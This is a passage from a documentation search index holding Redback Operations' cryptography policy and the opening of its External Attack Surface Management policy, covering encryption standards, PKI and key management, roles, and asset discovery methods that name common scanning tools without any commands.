Data in Transit​  TLS (Transport Layer Security) 1.2 or higher must be used for all data transmitted over public networks. This includes the use of secure versions of protocols for email, file transfer, and other communications. Insecure protocols such as SSL2, SSL3, TLS 1.0 &amp; TLS 1.1 are forbidden to be utilized without an existing security exemption. These protocols contain known vulnerabilities and should not be utilized. Post-quantum cryptography (e.g., CRYSTALS-Kyber) recommended where supported, pending infrastructure updates.  Data at Rest​  Symmetric Encryption​  For internal encryption needs, including data at rest, AES (Advanced Encryption Standard) with key sizes of 256 bits is approved.  Asymmetric Encryption​  For digital signatures and key exchange mechanisms, RSA with a minimum key size of 2048 bits or ECC with a minimum key size of 256 bits are approved.  Hashing​  SHA-256 or higher is approved for hashing operations.   Compliance and Auditing​  All use of encryption must comply with these standards, and exceptions must be approved by the Chief Information Security Officer (CISO). Regular audits should be conducted by the security &amp; I.T. teams (refer to RACI chart) to ensure compliance with these encryption standards, identifying and mitigating any scenarios that do not comply with this policy.  Adhering to these encryption standards is mandatory for all personnel involved in the handling of sensitive and confidential data. This ensures that Redback Operations’ data remains secure against emerging threats and vulnerabilities.   ","version":"Next","tagName":"h3"},{"title":"Key Management​","type":1,"pageTitle":"Cryptography Policy","url":"/redback-documentation/docs/company-policy/ISMS/cryptography#key-management","content":" Effective key management is a requirement to maintain the confidentiality, integrity &amp; availability of encrypted data. Note that at the time of writing this document, technical controls are limited due to pending infrastructure deployments, however this policy assumes the future use of Active Directory Certificate Authorities in the design of this solution.  ","version":"Next","tagName":"h2"},{"title":"Private Key Infrastructure​","type":1,"pageTitle":"Cryptography Policy","url":"/redback-documentation/docs/company-policy/ISMS/cryptography#private-key-infrastructure","content":" Note: The following section is a theoretical high-level design due to the nature of upcoming implementations. No PKI solution is implemented at the time of writing this policy.  Private Key Infrastructure (PKI) is a framework used to create, manage, distribute, use, store, and revoke digital certificates and manage public-key encryption. At the core of PKI is the Certificate Authority (CA), which issues digital certificates to verify the ownership of a public key by the named subject of the certificate.  This system enables users and computers to exchange data securely over the internet and verify the authenticity of the party they're communicating with, essentially underpinning various internet security and data encryption protocols. CAs play a crucial role in the PKI by ensuring the digital certificates they issue are created and distributed in a secure manner, providing the foundation for a trusted digital environment.  Redback Operations' Certificate Authority (CA) Hierarchy is structured to secure digital certificates crucial for encrypted communications and secure identity verification. The hierarchy includes:  Root Certificate Authority (Root CA)​  Serves as the trust anchor, issuing certificates to Intermediate CAs. The Root CA's operations are highly secure, with its key stored offline to minimize risk. It has a long validity period due to its foundational role in the trust chain.  Intermediate Certificate Authorities (Intermediate CAs)​  Intermediate CA’s sit between the Root CA and end entities, issuing certificates to devices, servers, and users. This layer of the certificate hierarchy adds flexibility and enhances security by limiting the Root CA's direct exposure and delegating certificate management roles between Intermediate CA’s. Certificates from Intermediate CAs have shorter validity periods for security and operational efficiency.   End Entity Certificates​  Issued to devices, servers, and users for secure communication within Redback Operations' network. Managed by Intermediate CAs to maintain the Root CA's integrity.  The CA Hierarchy employs Certificate Revocation Lists (CRLs) and the Online Certificate Status Protocol (OCSP) to manage the revocation status of certificates, ensuring the immediate identification and distrust of compromised certificates.  The CA operations comply with industry best practices and regulatory standards, including the CA/Browser Forum Baseline Requirements. Regular internal and external audits ensure the integrity of CA operations, certificate issuance, management, and revocation processes. This structured approach is critical for maintaining secure and trusted communication within and outside Redback Operations.  ","version":"Next","tagName":"h3"},{"title":"Certificate Authority Hierarchy​","type":1,"pageTitle":"Cryptography Policy","url":"/redback-documentation/docs/company-policy/ISMS/cryptography#certificate-authority-hierarchy","content":" The following section is based on a theoretical design for an upcoming virtualized environment deployment on-premises. While the initial deployment for Redback Operations will be Single Tier, our future target state will be based on improving our maturity for certificate management by moving to an environment that uses delegated CA roles in a more complex hierarchy.  Single/One Tier Hierarchy (Current)​  Structure: Combines the roles of Root Certificate Authority (CA) and Issuing CA into a single entity.Use Case: Suited for simple implementations where manageability and cost are more critical than the highest levels of security.Security: Can be enhanced with a Hardware Security Module (HSM) to protect the CA’s keys, though this adds to the cost.  Example:  References: (Microsoft Learn, Designing &amp; Implementing a PKI, 2024)      Two Tier Hierarchy​  Structure: Consists of an offline Root CA and one or more online Subordinate (Issuing) CAs.Use Case: Balances security, scalability, and flexibility, meeting the needs of most organizations.Security: The offline Root CA enhances security by protecting the root key from compromise. Scalability is achieved through the possibility of having multiple Issuing CAs under the Root CA.  Example:  References: (Microsoft Learn, Designing &amp; Implementing a PKI, 2024)      Three Tier Hierarchy​  Structure: Introduces an additional layer between the Root CA and the Issuing CAs, often referred to as a Policy CA.Use Case: Provides enhanced security and policy enforcement, serving as an administrative boundary within larger or more security-conscious organizations.Security: Allows for more granular control over certificate issuance policies and further isolates the Root CA from exposure, as the Policy CA handles specific operational policies or geographical distinctions.  Example:  References: (Microsoft Learn, Designing &amp; Implementing a PKI, 2024)      ","version":"Next","tagName":"h3"},{"title":"Key Management​","type":1,"pageTitle":"Cryptography Policy","url":"/redback-documentation/docs/company-policy/ISMS/cryptography#key-management-1","content":" Note: The following section is a theoretical high-level design due to the nature of upcoming implementations. No PKI solution is implemented at the time of writing this policy.  This section of the cryptography policy refers to standards that must be followed, and guidelines that provide direction and support subject to the context of a system being built or audited.  Key Generation​  Key generation is defined as the process of creating cryptographic keys that are used to encrypt and decrypt data. It's the foundation of an organization’s communication and data protection initiative.  Redback Operations Key Generation standard ensures that the keys generated are strong and secure enough to protect against unauthorized access and decryption attempts. Additionally, it ensures that specific cryptographic algorithms are recommended and followed due to their proven security strength and effectiveness.  Guideline &amp; Standards​  Utilize cryptographic modules compliant with FIPS 140-2 Level 3 or higher for key generation, ensuring high entropy and unpredictability. Algorithms such as: RSA (4096-bit for added security)ECC (Curve P-384)AES (256-bit) Only use cryptographic modules certified under global standards such as: FIPS 140-2Common Criteria EAL4+  Key Distribution​  Key distribution is the secure method of transferring cryptographic keys from one entity to another, ensuring that the keys are received and utilized solely by intended recipients. The Redback Operations Key Distribution standard safeguards the transmission and authentication process, thereby guaranteeing that the distribution of keys does not compromise their security.  Guideline &amp; Standards​  Ensure the use of secure encryption protocols such as TLS 1.3 ciphers for the transmission of keys over networks. This protocol enhances the security of key exchanges by ensuring encryption keys are not compromised, even if the server key is.For internal transfer, use secure, encrypted containers with two-factor authentication for access. Secure authentication utilizing Multi-Factor Authentication &amp; digital signatures. This step is crucial to ensure that cryptographic keys are only issued to verified individuals, thereby preventing unauthorized access.  Key Storage​  Key storage concerns the secure preservation of cryptographic keys, ensuring they are accessible solely by authorized systems and personnel.  The Redback Operations Key Storage standard focuses on encrypting and physically securing keys to prevent unauthorized access and compromise.  Guideline &amp; Standards​  Apply AES-256 encryption for storing keys digitally. This method utilizes a strong symmetric key algorithm to ensure the confidentiality and integrity of stored keys.Use hardware security modules (HSMs) that are FIPS 140-2 Level 3 certified for high-security environments. Store physical storage media in tamper-evident containers within secure facilities. Access should only be granted through biometric verification and Multi-Factor Authentication, further ensuring the security of physical keys. Adhere to established IDAM/IAM (Identity and Access Management) policies, ensuring minimal privilege access based on job roles. Employ access logging and continuous monitoring for unauthorized access attempts.   Key Rotation​  Key rotation involves the regular updating of cryptographic keys to mitigate the risk associated with the compromise of a single key. The Redback Operations Key Rotation standard specifies the frequency and procedure for changing keys, aiming to enhance the security of encrypted data over time.  Guideline &amp; Standards​  Implement automated key rotation for sensitive systems every 90 days or based on the sensitivity of the data being protected. Critical systems may require more frequent rotations. Implement an automated key rotation schedule that mandates the updating of cryptographic keys at predefined intervals.For keys protecting highly sensitive data, rotate at least every 90 days. For less sensitive data, a rotation period of up to 180 days may be acceptable.Document and justify any deviations from the standard rotation periods based on specific risk assessments or operational requirements. Automate the rotation process where possible using key management systems such as ACME (Automatic Certificate Management Environment) that support seamless rollover to new keys without service interruption, ensuring all old keys are replaced securely across systems.  Key Recovery​  Key recovery ensures that cryptographic keys can be securely retrieved in case of loss or compromise, maintaining the availability and integrity of encrypted data. The Redback Operations Key Recovery standard establishes protocols for the backup and recovery of keys, ensuring that data remains accessible under all circumstances.  Guideline &amp; Standards​  Implement automated backups of keys into secure, segregated storage solutions, with encryption in transit and at rest. Ensure backups are geographically distributed/redundant to mitigate against regional failures. Establish strict protocols for key recovery, requiring dual authorization from senior security personnel and logging all recovery actions for audit purposes.   Key Destruction​  Key destruction involves the secure deletion or destruction of cryptographic keys when they are no longer necessary, preventing unauthorized access to encrypted data. The Redback Operations Key Destruction standard focuses on methods that ensure keys are irrecoverably destroyed, safeguarding against unauthorized data decryption.  Guideline &amp; Standards​  Use cryptographic erasure techniques to render keys unrecoverable from storage media. Approved techniques include: Cryptographic Erasure (Crypto Shredding) – Directly deletes the encryption key, making encrypted data permanently inaccessible.Physical Destruction – Physically damages storage media (shredding, drilling, crushing) to prevent key retrieval.Overwriting – Writes random data over the location of the key multiple times to erase it.Degaussing – Uses a powerful magnet to disrupt magnetic fields, erasing data on magnetic storage media. Secure Deletion Software – Employs software to overwrite the key space with zeros and ones, following data destruction standards. Hardware Security Module (HSM) – Functions Utilizes HSMs' built-in functions for secure key deletion, ensuring keys within are irrecoverable. Maintain detailed logs of key destruction processes, including the justification for destruction and the methods used.   Audit and Compliance​  Audit and compliance within key management ensure adherence to established policies and regulatory requirements through regular monitoring, logging, and review. Redback Operations’ Audit and Compliance standard emphasizes the need for continuous oversight and validation of key management practices to maintain the integrity and security of cryptographic operations.  Guideline &amp; Standards​  Maintain detailed logs of all key management activities, including generation, distribution, storage, rotation, recovery, and destruction of keys. Use Security Information and Event Management (SIEM) tools for real-time monitoring and analysis. Refer to the Monitoring &amp; Logging Policy for more information.Conduct a regular audit schedule following the below guidelines: Conduct internal audits bi-annually to evaluate adherence to key management policies and identify areas for improvement.Ensure audit findings are benchmarked against established industry frameworks referenced in the Information Security Management System (ISMS).Update key management policies and practices based on findings from audits and reviews, as well as in response to new threats, technological advances, and regulatory changes. Regularly review key management processes and policies to ensure they align with the latest industry standards, regulatory requirements, and best practices.Adhere to existing Incident Response and Remediation strategies detailed as part of Redback Operations cyber security strategy: Ensure that incident response &amp; remediation plans are implemented for solutions impacted under this policy.Ensure incidents are raised for addressing non-compliance issues and security vulnerabilities identified during audits. Document all remediation actions taken and perform follow-up audits to ensure effective resolution.  Key Lifecycle Summary​  Adherence to these key management practices ensures the security of cryptographic keys throughout their lifecycle, thereby protecting the encrypted data they secure. This comprehensive approach to key management is a cornerstone of Redback Operation's initiative to maintain data security and privacy.  ","version":"Next","tagName":"h3"},{"title":"End-User Encryption Guidelines​","type":1,"pageTitle":"Cryptography Policy","url":"/redback-documentation/docs/company-policy/ISMS/cryptography#end-user-encryption-guidelines","content":" To ensure the security of sensitive data and compliance with Redback Operations' encryption policy, all end-users are required to adhere to the following encryption guidelines.  Note: Content provided in this section should correlate to other ISMS policies &amp; training modules that is referenced in the Redback Operations’ ISMS. Refer to these policies for further details relating to guidance and compliance.  Email &amp; File Encryption​  Emails containing sensitive or confidential information must be encrypted. Use the organization-approved email encryption tool.Encrypt attachments containing sensitive data before sending them via email.Verify the identity of email recipients before sending sensitive information.Encrypt files containing sensitive data before storing them on drives or sharing them through file-sharing platforms.Use approved encryption tools and follow the provided instructions for encrypting files.If a password is used to encrypt a file, ensure it is strong and shared securely with the recipient.  Secure Data Transmission​  Use secure methods, such as VPNs or encrypted file transfer services, for transmitting sensitive data. Avoid transmitting sensitive information over public Wi-Fi networks. If necessary, use a secure VPN connection. Ensure that any sensitive data stored on or accessed from mobile devices is encrypted.   Best Practices for Encryption​  Be aware of the types of data that require encryption according to the data classification policy.Use strong, unique passwords for accessing encrypted data and change them regularly.Keep devices that store or access encrypted data secure. Implement physical security measures and ensure devices are locked when not in use.Immediately report any suspected security incidents or difficulties in using encryption tools to the IT or security department.  Adherence to these guidelines is critical for maintaining the confidentiality and integrity of sensitive information within Redback Operations. All employees, contractors, and third-party partners are expected to comply with these guidelines to protect themselves and the organization from data breaches and other security risks.  ","version":"Next","tagName":"h3"},{"title":"Policy Review and Update​","type":1,"pageTitle":"Cryptography Policy","url":"/redback-documentation/docs/company-policy/ISMS/cryptography#policy-review-and-update","content":" To ensure the encryption/cryptography policy remains effective and relevant, Redback Operations commits to a regular review and update process.  The objective of the Policy Review and Update section is to ensure that the Encryption/Cryptography Cybersecurity Policy remains current, effective, and aligned with the evolving landscape of cybersecurity threats, technological advancements, regulatory changes, and organizational needs. Regular reviews and updates will facilitate the continuous improvement of encryption practices to safeguard sensitive data effectively.  Review Schedule &amp; Update Process​  The encryption policy will be reviewed at least bi-annually to assess its effectiveness and compliance with current laws and regulations. Additional reviews will be conducted in response to significant changes in the cybersecurity landscape, including new threats, vulnerabilities, technologies, or regulatory requirements.  Review Guidance &amp; Considerations​  Gather input from key stakeholders, including IT, security teams, legal, compliance, and business units, to identify areas for improvement.Incorporate emerging best practices and standards in encryption and data protection.Update the policy to reflect advances in encryption technologies and methodologies.Ensure the policy aligns with current legal and regulatory requirements related to data protection and privacy.Communicate any changes to the encryption policy to all affected parties promptly (Refer to the RACI chart for further information).Update training and awareness programs to reflect changes in the policy and emerging threats.  The commitment to continuous improvement through training, awareness, and regular policy reviews is essential for maintaining the security and integrity of sensitive information within Redback Operations. ","version":"Next","tagName":"h3"},{"title":"External Attack Surface Management","type":0,"sectionRef":"#","url":"/redback-documentation/docs/company-policy/ISMS/easm","content":"","keywords":"","version":"Next"},{"title":"Purpose​","type":1,"pageTitle":"External Attack Surface Management","url":"/redback-documentation/docs/company-policy/ISMS/easm#purpose","content":" The purpose of this policy is to define the framework and strategies Redback Operations will employ to identify, assess, and manage the risks associated with its external attack surface.  This policy aims to minimize the risk of cyber-attacks that could compromise the confidentiality, integrity, or availability of the company's assets and sensitive information. By proactively managing its external attack surface, Redback Operations seeks to safeguard its reputation, ensure business continuity, and comply with relevant regulations and standards.  This policy aims to achieve the following:  Ensure Comprehensive Risk Management​  Systematically address vulnerabilities and threats that could compromise the integrity, confidentiality, and availability of the organization's information assets accessible from external networks.  Align with Business Objectives​  Support Redback Operations' business objectives by ensuring that cybersecurity measures do not impede business agility and innovation, while still protecting the organization from external threats.  Compliance and Regulatory Adherence​  Meet legal, regulatory, and contractual obligations related to cybersecurity, thus protecting Redback Operations from legal and compliance risks.  Promote a Mature Security Culture​  Encourage a culture of security awareness and responsibility among all employees and stakeholders, making security a foundational aspect of all business operations and decision-making processes.   ","version":"Next","tagName":"h2"},{"title":"Scope​","type":1,"pageTitle":"External Attack Surface Management","url":"/redback-documentation/docs/company-policy/ISMS/easm#scope","content":" This policy applies to all employees, contractors, and third-party service providers of Redback Operations who interact with any external-facing IT assets, systems, networks, and applications. It covers all digital assets owned, operated, or managed by Redback Operations that can be accessed directly or indirectly from an external network. This includes any cloud/SaaS services exposed to the internet.  This policy is a component of the broader cyber security Information Security Management System (ISMS) of Redback Operations and interfaces with other policies on information security, incident response, and business continuity.  Digital Assets and Services​  All external-facing IT assets, including but not limited to websites, web applications, email servers, DNS servers, cloud services, and any other digital services accessible over the internet.  Data Protection​  The management and protection of data processed, stored, or transmitted through external-facing systems, ensuring its confidentiality, integrity, and availability.  Third-party Interactions​  The relationships and interactions with third-party vendors, partners, and service providers who may have access to or manage parts of the external attack surface.  Regulatory and Compliance Frameworks​  Adherence to applicable legal, regulatory, and industry standards affecting the management of the external attack surface, including but not limited to GDPR, HIPAA, PCI-DSS, and ISO/IEC 27001.  ","version":"Next","tagName":"h2"},{"title":"Criteria & Metrics for Policy Adherence​","type":1,"pageTitle":"External Attack Surface Management","url":"/redback-documentation/docs/company-policy/ISMS/easm#criteria--metrics-for-policy-adherence","content":" To ensure comprehensive coverage and consistent enforcement of the policy, specific criteria are defined to determine when and how the policy should be applied.  Accessibility from the Internet​  Any asset that is directly accessible from the Internet, whether through a public IP address, a DNS entry, or an exposed API, must be included under the scope of this policy. This encompasses all web-facing applications, servers, and cloud-based resources that can be accessed or interacted with from outside the internal network.   Ownership or Operation by Redback Operations​  All digital assets that are owned, operated, or managed by Redback Operations fall under this policy, regardless of their physical location or whether they are hosted on-premises or in cloud environments. This includes leased or rented digital resources and services contracted through third parties but managed directly by our team.  Potential for Compromise &amp; Risk Impact​  Assets that, if compromised, could lead to significant adverse effects such as unauthorized access, data breach, disruption of operations, or other critical security incidents need to be prioritized. The policy applies especially to assets containing sensitive information, critical operational technology, or those integral to business continuity.  Metrics for Monitoring Policy Adherence​  Coverage Ratio Measures the percentage of total identified assets that are covered by the policy’s security measures. Compliance Rate Tracks the adherence to security practices and controls as outlined in the policy across all applicable assets. Incident Response Effectiveness Assesses the timeliness and effectiveness of the response to security incidents involving external-facing assets.  Application of the Policy​  The application of these criteria ensures that the External Attack Surface Management Policy is consistently applied across all relevant assets, providing a clear framework for identifying which assets need to be secured and monitored. By adhering to these guidelines, Redback Operations aims to maintain a strong defensive posture against external threats and ensure the resilience and security of its operational and informational assets.   ","version":"Next","tagName":"h3"},{"title":"Framework References​","type":1,"pageTitle":"External Attack Surface Management","url":"/redback-documentation/docs/company-policy/ISMS/easm#framework-references","content":" The External Attack Surface Management Policy references the following framework controls:  ISO 27001 Controls​  A.5.23: Management of Information Security Incidents and ImprovementsA.5.7: Management of Technical VulnerabilitiesA.8.15: Network SecurityA.8.23: Configuration Management  CIS Controls​  Control 1: Inventory and Control of Enterprise AssetsControl 2: Inventory and Control of Software AssetsControl 4: Secure Configuration of Enterprise Assets and  Software​  Control 9: Data ProtectionControl 11: Network Infrastructure ManagementControl 12: Endpoint SecurityControl 18: Penetration Testing  ","version":"Next","tagName":"h3"},{"title":"Roles and Responsibilities​","type":1,"pageTitle":"External Attack Surface Management","url":"/redback-documentation/docs/company-policy/ISMS/easm#roles-and-responsibilities","content":" CISO (Chief Information Security Officer)​  Policy Oversight Ensures the External Attack Surface Management Policy aligns with Redback Operations’ overall security strategy and business objectives. Risk Management Oversees the identification, assessment, and mitigation strategies for risks associated with the external attack surface. Compliance and Reporting Ensures compliance with relevant laws, regulations, and standards.Reports on security posture and risk management effectiveness to executive management.  IT Department​  Asset Management &amp; Inventory Maintains an up-to-date inventory of all external-facing assets, including hardware and software components. Network Security Implements and manages firewalls, VPNs, and other network security measures to protect the external attack surface. Patch Management Regularly updates and patches systems and applications to address security vulnerabilities. Systems Administration Provides information technology support &amp; operational technology support (I.T. &amp; O.T.)   Security Team​  Vulnerability Assessment and Penetration Testing (VAPT) Conducts regular vulnerability assessments and penetration testing on external-facing assets to identify and remediate security weaknesses. Incident Response Leads the response to security incidents affecting the external attack surface, including investigation, containment, eradication, and recovery.Monitors external-facing assets for suspicious activity or breaches using SIEM, IDS/IPS, and other security tools. Developers Code Reviews, Security Collaboration and Security Testing Participates in code reviews and incorporates security testing (e.g., static, and dynamic analysis) as part of the development lifecycle.Works closely with the security team to address security issues identified in applications and implements security features and controls as advised.Adheres to secure coding standards and practices to minimize vulnerabilities in web applications and services.   RACI Chart​  A RACI chart is a management tool that outlines the roles and responsibilities of different team members for specific tasks or processes. The chart helps clarify expectations, improves communication, and ensures that all tasks have clear ownership, making it easier to manage projects and processes efficiently.  Legend:  **R (Responsible): **  Person or group who performs the activity.  A (Accountable):  Person who is ultimately accountable.  **C (Consulted): **  Person or group that provides information and/or expertise.  **I (Informed): **  Person or group that needs to be informed after the decision or action is taken.  Activity/Role\tCISO\tIT Department\tSecurity Team\tDevelopersAsset Discovery &amp; Inventory\tI\tRA\tRC\tI Risk Identification\tA\tC\tRA\tI Risk Analysis\tA\tC\tRA\tI Risk Prioritization\tA\tC\tRC\tI Risk Mitigation\tA\tR\tRA\tR Risk Remediation\tA\tR\tRA\tR Implementing Security Controls\tAC\tRA\tRA\tR Policy Management\tR\tC\tRA\tC Vulnerability Assessment (VAPT)\tC\tC\tRA\tI Incident Response\tA\tR\tRA\tI Secure Coding\tA\tI\tA\tRA Security Strategy\tRA\tC\tRC\tI  ","version":"Next","tagName":"h3"},{"title":"External Attack Surface Components​","type":1,"pageTitle":"External Attack Surface Management","url":"/redback-documentation/docs/company-policy/ISMS/easm#external-attack-surface-components","content":" To effectively manage and protect Redback Operations' external attack surface, a comprehensive identification of all external-facing components is mandatory. The external attack surface of Redback Operations encompasses all digital assets, systems, and services accessible from outside the organization's internal network.  These components can be broadly categorized into several key areas, each with technical examples.  ","version":"Next","tagName":"h2"},{"title":"Types of Digital Assets​","type":1,"pageTitle":"External Attack Surface Management","url":"/redback-documentation/docs/company-policy/ISMS/easm#types-of-digital-assets","content":" The types of digital assets this policy refers to may include:  Web-facing Applications and Services​  Public Websites, Gateways and Portals Main websites, customer portals, and blogs hosted on domains owned by Redback Operations. Web Applications Online applications offering services or interactions to users, such as: Web-based email systemsCRM platformsCustom business applicationsApplication Programming Interface (API’s)  Network Infrastructure​  DNS Servers Servers responsible for resolving domain names into IP addresses for the organization. Firewalls and Edge Devices Devices positioned at the boundary of the network to protect internal networks from external threats.Example: Next-generation firewalls (NGFWs) that include intrusion prevention systems (IPS). VPN/Remote Access Gateways Endpoints for VPN access that allow remote users to connect securely to the internal network. Example: SSL VPN appliances for secure remote access.  Cloud Services and Infrastructure​  Cloud-based Web Hosting Services used for hosting websites and web applications on cloud platforms. Cloud Storage Publicly accessible cloud storage buckets or containers. Example: Microsoft Azure Storage accounts IaaS, PaaS &amp; SaaS Services Cloud-based applications accessed by users over the Internet. Example: Salesforce CRM, Google Workspace.  Email and Communication Servers​  Email Servers Servers handling incoming and outgoing email communications.Example: SMTP, IMAP, and POP3 servers accessible from the internet for email exchange. Unified Communications Systems Systems that provide communications services such as VoIP, video conferencing, and instant messaging.Example: Microsoft Teams or Zoom servers configured for external access.   Remote Access Services​  Remote Desktop Services Services allowing remote control of desktops or servers within the organization's network. Example: Remote Desktop Protocol (RDP) endpoints. Network Management Systems Tools and systems used for managing and monitoring the network infrastructure, which might be accessible from the internet for remote management purposes.Example: SNMP (Simple Network Management Protocol) interfaces on network devices. Privileged Access Management Platform Platform/solution utilized for managing service and application identities and facilitating privileged access for sensitive/protected systems.  Identifying these components involves a detailed inventory and regular audits to ensure that all external-facing assets are known, managed, and secured. This includes not only the direct exposure of services to the internet but also indirect exposures through third-party services and integrations that might provide pathways into the organization’s network.   ","version":"Next","tagName":"h3"},{"title":"Methodology​","type":1,"pageTitle":"External Attack Surface Management","url":"/redback-documentation/docs/company-policy/ISMS/easm#methodology","content":" Asset discovery is a critical first step in managing Redback Operations' external attack surface effectively. It involves identifying all assets that are part of or can interact with the external digital environment. These assets include, but are not limited to, web servers, domain names, DNS servers, external IP addresses, cloud services, and third-party services.  A comprehensive asset discovery process ensures that all components exposed to potential external threats are accounted for, monitored, and protected.  ","version":"Next","tagName":"h2"},{"title":"Asset Discovery​","type":1,"pageTitle":"External Attack Surface Management","url":"/redback-documentation/docs/company-policy/ISMS/easm#asset-discovery","content":" This Asset Discovery methodology is integral to our External Attack Surface Management Policy, enabling Redback Operations to systematically identify, monitor, and secure our digital assets against external threats. Through this comprehensive approach, we bolster our defence mechanisms, enhancing our cybersecurity posture and protecting company assets.  Automated Scanning and Enumeration​  Automated scanning techniques form the backbone of our Asset Discovery process. While there is no mandatory requirement to use specific tooling, provided in this section of the report is a typical penetration testing methodology used for enumeration &amp; discovery of attack surface and vulnerabilities.  This involves deploying systematic approaches to uncover and catalogue all internet-facing assets:  Port &amp; Service Scanning​  Nmap (Network Mapper) is a powerful tool often used for network discovery and security auditing. In port scanning, Nmap is utilized to scan target IP addresses to identify open ports and associated services, providing insights into potential entry points for security threats.  Network Mapping​  Zenmap is the official graphical user interface (GUI) for Nmap, which facilitates easier visualization of network mapping. It helps in plotting the network structure, showing all the connected devices and the relationships between them, crucial for spotting potential vulnerabilities.  Vulnerability Scanning​  Nessus vulnerability scanning is known for its comprehensive detection capabilities. It automatically scans systems, networks, and applications to identify vulnerabilities, including misconfigurations and outdated software prone to exploits.  Banner Grabbing​  Netcat is a versatile networking tool used for reading from and writing to network connections using TCP or UDP. It is particularly effective for banner grabbing, where it can retrieve details about software running on an open port, aiding in the identification of out-of-date systems or applications.  Web Application Scanning​  The OWASP Zed Attack Proxy (ZAP) is an open-source web application security scanner. It automatically finds security vulnerabilities in web applications while they are running, making it a valuable tool for organizations to secure their web-based services and platforms.  DNS Enumeration​  DNSEnum is a script that combines the power of multiple DNS enumeration techniques. It uses DNS diagnostics and records to extract valuable information about domain-related entries, providing insights into potentially misconfigured domains and subdomains.  API Endpoint Discovery​  Postman is extremely useful for API endpoint discovery and testing. By analysing API traffic and responses, security teams can identify undocumented or loosely secured API endpoints that might be vulnerable to attacks.  Cloud Asset Identification​  Given the extensive use of cloud services, identifying assets deployed in cloud environments is critical. This step ensures a comprehensive view of our external attack surface.  Cloud-native Discovery Tools​  Leveraging tools provided by cloud service providers to enumerate and manage resources. This includes inventorying all assets deployed, from virtual machines to storage accounts, across our cloud environments.  Example of native tools utilized include:  Microsoft Defender for CloudAzure Security CentreAzure Resource Manager.Google Cloud Resource ManagerGoogle Cloud Asset InventoryGoogle Cloud Security Command Centre   Manual Verification, Auditing &amp; Continuous Discovery​  To complement automated discovery processes, manual verification by security teams ensures the accuracy and completeness of our asset inventory.  As part of Redback Operations' comprehensive External Attack Surface Management Policy, manual verification and auditing are crucial for ensuring the accuracy and effectiveness of our security measures. Here are the key manual techniques included in the policy:  Audit and Verification​  Engage in manual checks and reviews to validate the findings from automated scans and enumerations, ensuring no asset is overlooked and all information is up to date.  Physical Network Inspections​  To validate the accuracy of automated scanning results, physical inspections of network hardware and configurations are conducted. This includes verifying the settings on routers, switches, and servers to ensure compliance with our security standards.  Firewall and Network Configuration Reviews​  Administrators are required to manually review firewall and network device configurations regularly. This involves accessing devices through secure interfaces like PuTTY or SecureCRT to check for proper rule enforcement and to ensure that only necessary ports and services are exposed.  Penetration Testing​  Our policy mandates regular manual penetration testing to simulate potential security breaches. This testing is performed by qualified personnel using specialized tools such as Metasploit and Burp Suite from the Kali Linux distribution, providing a real-world assessment of our defences.  Code Review and Security Audits​  Developers must conduct thorough manual reviews of code, particularly for web applications and services that are part of our external attack surface. This process helps identify and rectify security vulnerabilities that automated tools may miss.  Policy Compliance Reviews​  Regular reviews of security policies and practices are required to ensure ongoing compliance with legal and regulatory standards. This manual review ensures that all operational practices are up-to-date and effective in mitigating security risks.   Integration with Centralized Asset Management​  In the context of Redback Operations' External Attack Surface Management Policy, the integration of asset discovery and monitoring data into a centralized asset management system is critical for ongoing monitoring and discovery of company assets.  This process ensures that all information regarding external-facing assets is accurately maintained and readily accessible, enhancing our security posture. Here are the key aspects of this integration process included in our policy:  Note: This section refers to a theoretical high-level design that is not yet implemented due to missing tooling and infrastructure. No centralized asset management system exists currently.  Centralized Inventory Updates​  Automated and manually verified asset discovery results are systematically fed into a centralized asset management system. This ensures that our asset inventory is comprehensive and up to date, providing a single source of truth for all asset-related information.  Continuous Synchronization​  Our policy requires continuous synchronization between asset discovery tools and the centralized asset management system. Any changes detected in the external attack surface, such as the addition of new assets or modification of existing ones, are automatically updated to maintain current asset records.  Security Data Integration​  Security configurations, vulnerability data, and compliance statuses are integrated into the centralized system. This provides a holistic view of each asset’s security posture, facilitating more effective risk assessment and management.  Access Control and Accountability​  Strict access controls are enforced to ensure that only authorized personnel can view or modify asset information. Audit logs are maintained to track changes, providing accountability, and aiding in forensic investigations if needed.  Automated Reporting​  The centralized asset management system generates automated reports that provide insights into the status, vulnerabilities, and compliance of all external-facing assets. These reports are crucial for ongoing security assessments and decision-making processes.   Continuous Discovery:​  Asset discovery is not a one-time activity but an ongoing process. As Redback Operations evolves, new assets will be created, and existing assets may change or be decommissioned. Continuous discovery ensures that the organization's external attack surface is accurately represented in real-time, allowing for proactive security management.  To address gaps and unregistered/rogue assets, the techniques listed in this policy’s Methodology section are to be used during annual reviews to ensure maximum policy coverage and adherence across Redback Operations’ systems &amp; infrastructure.  By adhering to this methodology, Redback Operations can ensure a thorough and effective asset discovery process, laying the groundwork for comprehensive external attack surface management. This proactive approach enables the organization to identify, assess, and manage risks associated with each external asset, enhancing the overall security posture and resilience against cyber threats.  ","version":"Next","tagName":"h3"},{"title":"Risk Management​","type":1,"pageTitle":"External Attack Surface Management","url":"/redback-documentation/docs/company-policy/ISMS/easm#risk-management","content":" Risk Management in the context of the External Attack Surface Management Policy involves a systematic process to identify, analyse, prioritize, mitigate, and remediate risks associated with external digital assets. This ensures continuous protection against vulnerabilities and external threats, while reducing the overall external attack surface and maximizing coverage of IT Systems &amp; Infrastructure.  Note: This section of the External ASM Policy adheres to Redback Operations’ ISMS Risk Management Framework &amp; Security Compliance Frameworks. Refer to the relevant policy for further details regarding Risk Management  Risk Identification​  OverviewThe initial phase in the risk management process where potential security risks associated with external-facing assets are detected and documented.  PurposeTo uncover all possible sources of security threats so that they can be thoroughly analysed and addressed in subsequent steps.  Risk Identification involves:  Automated Vulnerability Scanning &amp; Discovery Deploy continuous scanning mechanisms to identify vulnerabilities in real-time across all external-facing assets.This includes detecting outdated software, misconfigurations, and known security flaws. Threat Intelligence Integration Utilize advanced threat intelligence platforms to gather and analyse data on new and emerging threats that could potentially affect our external systems. Targeted Penetration Testing Schedule and execute regular and targeted penetration tests to simulate attacks on external-facing assets and identify exploitable vulnerabilities.  Risk Analysis​  OverviewThis stage involves a deeper examination of the identified risks to understand their nature, potential impacts, and the likelihood of occurrence.  PurposeTo quantify and qualify risks, enabling focused and prioritized risk management efforts based on potential impacts to the organization.  Risk Analysis Involves:  Impact AnalysisConduct a detailed analysis of the potential impacts of identified risks, considering factors such as the sensitivity of data exposed, potential operational disruptions, financial implications, and reputational damage.  Likelihood AssessmentEvaluate the probability of each risk occurring based on existing security controls, historical data, and current threat landscape insights.   Risk Prioritization​  OverviewFollowing analysis, risks are prioritized based on their potential impact and probability, ensuring that resources are allocated efficiently to address the most significant threats.  PurposeTo strategically 